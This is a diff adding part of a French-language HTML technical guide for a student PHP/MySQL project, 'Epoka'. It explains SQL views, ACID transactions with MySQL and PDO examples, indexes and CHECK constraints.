+<span class="kw">CREATE VIEW</span> <span class="f">vue_missions_details</span> <span class="kw">AS</span>
+    <span class="kw">SELECT</span> m.id, m.intitule, m.statut, m.date_debut, m.date_fin,
+           <span class="f">CONCAT</span>(s.prenom, <span class="s">' '</span>, s.nom) <span class="kw">AS</span> salarie,
+           vd.nom <span class="kw">AS</span> ville_depart,
+           va.nom <span class="kw">AS</span> ville_arrivee
+    <span class="kw">FROM</span>   mission m
+    <span class="kw">JOIN</span>   salarie s  <span class="kw">ON</span> m.id_salarie       = s.id
+    <span class="kw">JOIN</span>   ville   vd <span class="kw">ON</span> m.id_ville_depart  = vd.id
+    <span class="kw">JOIN</span>   ville   va <span class="kw">ON</span> m.id_ville_arrivee = va.id;
+
+<span class="c">-- Utiliser la vue comme une table</span>
+<span class="kw">SELECT</span> * <span class="kw">FROM</span> <span class="f">vue_missions_details</span> <span class="kw">WHERE</span> statut = <span class="s">'brouillon'</span>;
+
+<span class="c">-- Supprimer la vue</span>
+<span class="kw">DROP VIEW IF EXISTS</span> <span class="f">vue_missions_details</span>;
+</pre>
+
+<h2 class="sec">Transactions — Propriétés ACID</h2>
+<p>Une transaction groupe plusieurs requêtes en une opération <strong>atomique</strong> : soit tout réussit (COMMIT), soit tout est annulé (ROLLBACK). Indispensable pour maintenir la cohérence des données.</p>
+
+<h3 class="sub">Propriétés ACID</h3>
+<table>
+  <tr><th>Propriété</th><th>Signification</th><th>Exemple</th></tr>
+  <tr><td><strong>A — Atomicité</strong></td><td>Tout ou rien : si une opération échoue, tout est annulé</td><td>Virement bancaire : débit ET crédit, sinon ni l'un ni l'autre</td></tr>
+  <tr><td><strong>C — Cohérence</strong></td><td>La base reste dans un état valide avant et après</td><td>Contraintes FK respectées après la transaction</td></tr>
+  <tr><td><strong>I — Isolation</strong></td><td>Les transactions concurrentes n'interfèrent pas entre elles</td><td>Deux users modifient simultanément — chacun voit un état cohérent</td></tr>
+  <tr><td><strong>D — Durabilité</strong></td><td>Un COMMIT est permanent, même après une panne serveur</td><td>Données écrites sur disque, pas seulement en mémoire</td></tr>
+</table>
+
+<pre>
+<span class="c">-- Exemple MySQL : mise à jour atomique du statut d'une mission</span>
+<span class="kw">START TRANSACTION</span>;
+
+<span class="kw">UPDATE</span> mission <span class="kw">SET</span> statut = <span class="s">'validee'</span> <span class="kw">WHERE</span> id = 7 <span class="kw">AND</span> statut = <span class="s">'brouillon'</span>;
+
+<span class="c">-- Vérifier que la mise à jour a bien eu lieu</span>
+<span class="kw">IF ROW_COUNT</span>() = 1 <span class="kw">THEN</span>
+    <span class="kw">COMMIT</span>;    <span class="c">-- Valider définitivement</span>
+<span class="kw">ELSE</span>
+    <span class="kw">ROLLBACK</span>;  <span class="c">-- Annuler tout</span>
+<span class="kw">END IF</span>;
+</pre>
+
+<pre>
+<span class="c">// En PHP/PDO : transactions pour l'import de données</span>
+<span class="k">try</span> {
+    <span class="v">$db</span>-><span class="f">beginTransaction</span>();
+
+    <span class="k">foreach</span> (<span class="v">$villes</span> <span class="k">as</span> <span class="v">$ville</span>) {
+        <span class="v">$stmt</span>-><span class="f">execute</span>([<span class="v">$ville</span>[<span class="s">'nom'</span>], <span class="v">$ville</span>[<span class="s">'cp'</span>]]);
+    }
+
+    <span class="v">$db</span>-><span class="f">commit</span>();   <span class="c">// Tout a réussi → valider</span>
+} <span class="k">catch</span> (<span class="n">Exception</span> <span class="v">$e</span>) {
+    <span class="v">$db</span>-><span class="f">rollBack</span>(); <span class="c">// Une erreur → annuler tout l'import</span>
+    <span class="k">throw</span> <span class="v">$e</span>;
+}
+</pre>
+
+<h2 class="sec">Index — Optimisation des requêtes</h2>
+<pre>
+<span class="c">-- Créer un index sur la colonne statut (requêtes WHERE statut = ? accélérées)</span>
+<span class="kw">CREATE INDEX</span> idx_mission_statut <span class="kw">ON</span> mission(statut);
+
+<span class="c">-- Index composite (pour des filtres multi-colonnes)</span>
+<span class="kw">CREATE INDEX</span> idx_mission_salarie_statut <span class="kw">ON</span> mission(id_salarie, statut);
+
+<span class="c">-- Voir les index d'une table</span>
+<span class="kw">SHOW INDEX FROM</span> mission;
+
+<span class="c">-- Analyser une requête (affiche si l'index est utilisé)</span>
+<span class="kw">EXPLAIN SELECT</span> * <span class="kw">FROM</span> mission <span class="kw">WHERE</span> statut = <span class="s">'brouillon'</span>;
+</pre>
+
+<div class="info">
+  <strong>Quand créer un index ?</strong> Sur les colonnes utilisées fréquemment dans WHERE, JOIN ON, ORDER BY. Les clés étrangères sont automatiquement indexées par MySQL InnoDB. Trop d'index ralentit les INSERT/UPDATE/DELETE (les index doivent être mis à jour à chaque modification).
+</div>
+
+<h2 class="sec">Contraintes de domaine — CHECK</h2>
+<pre>
+<span class="c">-- Contraindre une valeur à une plage (MySQL 8+)</span>
+<span class="kw">ALTER TABLE</span> parametre
+    <span class="kw">ADD CONSTRAINT</span> chk_prix_km_positif
+    <span class="kw">CHECK</span> (prix_km > 0),
+    <span class="kw">ADD CONSTRAINT</span> chk_prix_nuit_positif
+    <span class="kw">CHECK</span> (prix_hebergement > 0);
+
+<span class="kw">ALTER TABLE</span> mission
+    <span class="kw">ADD CONSTRAINT</span> chk_dates_coherentes
+    <span class="kw">CHECK</span> (date_fin >= date_debut);
+
+<span class="c">-- Si la contrainte est violée lors d'un INSERT/UPDATE → erreur SQL</span>
+</pre>
+
+<br><br>
+<div style="text-align:center;color:#9ca3af;font-size:.8rem;border-top:1px solid #e5e7eb;padding-top:1.5rem;margin-top:2rem;">
+  <strong>Document technique — Application Epoka — BTS SIO Option SLAM</strong><br>
+  PHP 8 · MySQL · PDO · MVC · AJAX · Sécurité OWASP<br><br>
+  <em>Pour générer le PDF : ouvrez ce fichier dans Chrome/Edge → Ctrl+P → Destination : Enregistrer en PDF → Mise en page : Portrait → Marges : Minimum</em>
+</div>
+
+</div>
+</body>
+</html>
